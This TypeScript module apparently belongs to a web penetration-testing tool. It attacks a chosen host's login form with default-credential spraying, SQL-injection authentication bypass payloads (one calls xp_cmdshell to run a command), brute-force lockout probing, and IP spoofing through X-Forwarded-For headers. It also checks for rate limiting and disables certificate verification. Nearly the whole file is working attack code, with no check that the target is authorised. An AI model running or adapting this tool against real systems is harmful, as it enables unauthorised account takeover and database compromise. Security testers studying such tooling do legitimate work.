import * as http from "http";
import * as https from "https";
import { randomBytes } from "crypto";

export interface AuthTesterConfig {
  target: string;
  port: number;
  loginPath: string;
  usernameField: string;
  passwordField: string;
  technique: string;
  customUsers?: string[];
  customPasswords?: string[];
}

export interface AuthTestResult {
  technique: string;
  username: string;
  password: string;
  status: "bypassed" | "found" | "failed" | "error" | "lockout_bypass" | "info";
  statusCode?: number;
  responseTime?: number;
  evidence?: string;
  timestamp: number;
}

export interface AuthTesterJob {
  id: string;
  config: AuthTesterConfig;
  startTime: number;
  active: boolean;
  results: AuthTestResult[];
  summary: { bypassed: number; found: number; tested: number; lockoutDetected: boolean };
}

const jobs = new Map<string, AuthTesterJob>();
function makeId() { return randomBytes(8).toString("hex"); }

const DEFAULT_CREDENTIALS = [
  { u: "admin", p: "admin" }, { u: "admin", p: "password" }, { u: "admin", p: "admin123" },
  { u: "admin", p: "123456" }, { u: "admin", p: "password123" }, { u: "admin", p: "" },
  { u: "administrator", p: "administrator" }, { u: "administrator", p: "admin" },
  { u: "root", p: "root" }, { u: "root", p: "toor" }, { u: "root", p: "" },
  { u: "test", p: "test" }, { u: "guest", p: "guest" }, { u: "user", p: "user" },
  { u: "admin", p: "letmein" }, { u: "admin", p: "welcome" }, { u: "admin", p: "qwerty" },
  { u: "admin", p: "admin@123" }, { u: "admin", p: "P@ssw0rd" }, { u: "admin", p: "Admin123!" },
  { u: "superadmin", p: "superadmin" }, { u: "superuser", p: "superuser" },
  { u: "sa", p: "sa" }, { u: "sysadmin", p: "sysadmin" },
  { u: "webmaster", p: "webmaster" }, { u: "demo", p: "demo" },
];

const AUTH_BYPASS_PAYLOADS = [
  { u: "' OR '1'='1", p: "' OR '1'='1" },
  { u: "admin'--", p: "anything" },
  { u: "admin' #", p: "anything" },
  { u: "admin'/*", p: "anything" },
  { u: "' OR 1=1--", p: "' OR 1=1--" },
  { u: "' OR 'x'='x", p: "' OR 'x'='x" },
  { u: "admin' OR '1'='1'--", p: "any" },
  { u: "\" OR \"\"=\"", p: "\" OR \"\"=\"" },
  { u: "admin\" --", p: "anything" },
  { u: "') OR ('1'='1", p: "') OR ('1'='1" },
  { u: "'; EXEC xp_cmdshell('id')--", p: "x" },
];

const LOCKOUT_TEST_USERS = ["nonexistent_user_xyzabc", "admin"];

function isBypass(code: number, body: string, referer: string): boolean {
  if (code >= 200 && code < 400 && code !== 401 && code !== 403) {
    const lower = body.toLowerCase();
    const bypassIndicators = ["dashboard", "welcome", "logout", "signed in", "log out", "profile", "my account"];
    return bypassIndicators.some((k) => lower.includes(k));
  }
  return false;
}

function sendAuth(
  config: AuthTesterConfig,
  username: string,
  password: string,
  extraHeaders: Record<string, string> = {},
  cb: (code: number, body: string, headers: Record<string, string | string[]>, rt: number, err?: string) => void
) {
  const isHttps = config.port === 443;
  const mod: typeof http | typeof https = isHttps ? https : http;
  const body = `${config.usernameField}=${encodeURIComponent(username)}&${config.passwordField}=${encodeURIComponent(password)}`;
  const start = Date.now();

  const req = mod.request({
    hostname: config.target, port: config.port, path: config.loginPath,
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "Content-Length": String(body.length),
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      ...extraHeaders,
    },
    timeout: 8000, rejectUnauthorized: false,
  }, (res) => {
    let data = "";
    res.on("data", (c: Buffer) => { data += c.toString().slice(0, 2048); });
    res.on("end", () => cb(res.statusCode ?? 0, data, res.headers as any, Date.now() - start));
  });
  req.on("timeout", () => { req.destroy(); cb(0, "", {}, 8000, "timeout"); });
  req.on("error", (e) => cb(0, "", {}, 0, e.message));
  req.write(body);
  req.end();
}

export function startAuthTest(config: AuthTesterConfig): AuthTesterJob {
  const id = makeId();
  const job: AuthTesterJob = {
    id, config, startTime: Date.now(),
    active: true, results: [],
    summary: { bypassed: 0, found: 0, tested: 0, lockoutDetected: false },
  };
  jobs.set(id, job);

  const addResult = (r: AuthTestResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "bypassed") job.summary.bypassed++;
    if (r.status === "found") job.summary.found++;
  };

  const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

  const runAll = async () => {
    const techniques = config.technique === "all"
      ? ["default-creds", "sqli-bypass", "lockout-bypass", "rate-limit-check"]
      : [config.technique];

    if (techniques.includes("default-creds")) {
      const credList = config.customUsers && config.customPasswords
        ? config.customUsers.flatMap((u) => (config.customPasswords ?? []).map((p) => ({ u, p })))
        : DEFAULT_CREDENTIALS;

      for (const { u, p } of credList) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendAuth(config, u, p, {}, (code, body, headers, rt, err) => {
            if (err) {
              addResult({ technique: "default-creds", username: u, password: p, status: "error", evidence: err, timestamp: Date.now() });
              return resolve();
            }
            const bypass = isBypass(code, body, "");
            const loginFail = body.toLowerCase().includes("invalid") || body.toLowerCase().includes("incorrect") || body.toLowerCase().includes("failed");
            addResult({
              technique: "default-creds", username: u, password: p,
              status: bypass ? "found" : "failed",
              statusCode: code, responseTime: rt,
              evidence: bypass ? `HTTP ${code} — response contains authenticated indicators` : undefined,
              timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(200);
      }
    }

    if (techniques.includes("sqli-bypass") && job.active) {
      for (const { u, p } of AUTH_BYPASS_PAYLOADS) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendAuth(config, u, p, {}, (code, body, headers, rt, err) => {
            if (err) {
              addResult({ technique: "sqli-bypass", username: u, password: p, status: "error", evidence: err, timestamp: Date.now() });
              return resolve();
            }
            const bypass = isBypass(code, body, "");
            addResult({
              technique: "sqli-bypass", username: u, password: p,
              status: bypass ? "bypassed" : "failed",
              statusCode: code, responseTime: rt,
              evidence: bypass ? `Authentication bypass confirmed — SQL injection in ${config.usernameField} field allows unauthenticated login` : undefined,
              timestamp: Date.now(),
            });
            resolve();
          });
        });
        await delay(150);
      }
    }

    if (techniques.includes("lockout-bypass") && job.active) {
      for (const user of LOCKOUT_TEST_USERS) {
        if (!job.active) break;
        const wrongPasses = ["wrong1", "wrong2", "wrong3", "wrong4", "wrong5", "wrong6", "wrong7", "wrong8", "wrong9", "wrong10"];
        let lockoutTriggered = false;
        for (const wp of wrongPasses) {
          if (!job.active) break;
          await new Promise<void>((resolve) => {
            sendAuth(config, user, wp, {}, (code, body, headers, rt, err) => {
              if (code === 429 || body.toLowerCase().includes("locked") || body.toLowerCase().includes("too many")) {
                lockoutTriggered = true;
                job.summary.lockoutDetected = true;
                addResult({ technique: "lockout-bypass", username: user, password: wp, status: "info", statusCode: code, responseTime: rt, evidence: `Account lockout triggered after attempts — this is good security behavior`, timestamp: Date.now() });
              }
              resolve();
            });
          });
          if (lockoutTriggered) break;
          await delay(100);
        }

        if (!lockoutTriggered && job.active) {
          addResult({ technique: "lockout-bypass", username: user, password: "multiple", status: "lockout_bypass", evidence: `No account lockout detected after 10 failed attempts for user '${user}' — brute force is possible`, timestamp: Date.now() });

          await new Promise<void>((resolve) => {
            const bypassHeaders = { "X-Forwarded-For": "1.2.3.4", "X-Real-IP": "5.6.7.8", "X-Originating-IP": "9.10.11.12" };
            sendAuth(config, user, "wrong", bypassHeaders, (code, body, headers, rt, err) => {
              addResult({ technique: "lockout-bypass", username: user, password: "bypass-headers", status: "info", statusCode: code, responseTime: rt, evidence: `Header spoofing test — if IP-based lockout can be bypassed using X-Forwarded-For manipulation`, timestamp: Date.now() });
              resolve();
            });
          });
        }
      }
    }

    if (techniques.includes("rate-limit-check") && job.active) {
      const results: number[] = [];
      for (let i = 0; i < 20; i++) {
        if (!job.active) break;
        await new Promise<void>((resolve) => {
          sendAuth(config, "testuser", "testpass", {}, (code, body, headers, rt, err) => {
            results.push(code);
            if (i === 19) {
              const rateLimited = results.some((c) => c === 429);
              const avgRt = results.reduce((a, b) => a + b, 0) / results.length;
              addResult({
                technique: "rate-limit-check", username: "testuser", password: "(20 rapid requests)",
                status: "info",
                evidence: rateLimited
                  ? "Rate limiting active (HTTP 429 received) — brute force protection is working"
                  : `No rate limiting detected across 20 rapid requests (codes: ${[...new Set(results)].join(",")}) — endpoint is vulnerable to brute force`,
                timestamp: Date.now(),
              });
            }
            resolve();
          });
        });
        await delay(50);
      }
    }

    job.active = false;
    jobs.delete(id);
  };

  runAll();
  return job;
}

export function getAuthJob(id: string): AuthTesterJob | undefined {
  return jobs.get(id);
}

export function stopAuthTest(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
